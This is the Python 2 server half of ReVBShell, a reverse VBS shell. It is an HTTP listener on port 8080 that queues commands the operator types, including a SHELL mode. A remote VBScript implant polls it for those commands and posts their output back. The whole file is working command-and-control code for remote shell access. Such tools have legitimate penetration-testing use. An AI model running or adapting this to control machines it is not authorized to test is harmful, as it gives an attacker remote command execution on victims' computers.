#!/usr/bin/python
#
# This software is provided under under the BSD 3-Clause License.
# See the accompanying LICENSE file for more information.
#
# Server for Reverse VBS Shell
#
# Author:
#  Arris Huijgen
#
# Website:
#  https://github.com/bitsadmin/ReVBShell
#

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from urlparse import parse_qs
from Queue import Queue
from threading import Thread

PORT_NUMBER = 8080


class myHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # File download
        if self.path.startswith('/f/'):
            self.send_response(200)
            self.send_header('content-type', 'text/plain')
            self.end_headers()
            self.wfile.write('xxx')
            return

        if commands.empty():
            content = 'NOOP'
        else:
            content = commands.get()

        # Return result
        self.send_response(200)
        self.send_header('content-type', 'text/plain')
        self.end_headers()
        self.wfile.write(content)
        return

    # Result from executing command
    def do_POST(self):
        length = int(self.headers['content-length'])
        result = parse_qs(self.rfile.read(length), keep_blank_values=1)['result'][0]
        print result
        self.send_response(200)
        self.send_header('content-type', 'text/plain')
        self.end_headers()
        self.wfile.write('OK')
        return

    def log_message(self, format, *args):
        return


def run_httpserver():
    #commands.put('dir C:\\')
    server = HTTPServer(('', PORT_NUMBER), myHandler)
    server.serve_forever()

commands = Queue()

try:
    # Start HTTP server thread
    #run_httpserver() # Run without treads for debugging purposes
    httpserver = Thread(target=run_httpserver)
    httpserver.start()

    # Loop to add new commands
    context = ''
    while True:
        s = raw_input("%s> " % context)
        s = s.strip()

        # In a context
        if context == 'SHELL':
            cmd = context

            if s.upper() == 'EXIT':
                context = ''
                continue
            else:
                args = s

                # Ignore empty commands
                if not args:
                    continue
        # No context
        else:
            splitcmd = s.split(' ', 1)
            cmd = splitcmd[0].upper()
            args = ''

            # Ignore empty commands
            if not cmd:
                continue

            # Two options for input commands
            # 1) Full command is entered, i.e.: SHELL dir C:\
            if len(splitcmd) > 1:
                args = splitcmd[1]
            # 2) Only context change, i.e.: SHELL
            elif cmd == 'SHELL':
                context = 'SHELL'
                continue
            else:
                print '%s > Unknown command: %s' % (context, s)

        commands.put(' '.join([cmd, args]))


except KeyboardInterrupt:
    print '^C received'
    #server.socket.close()
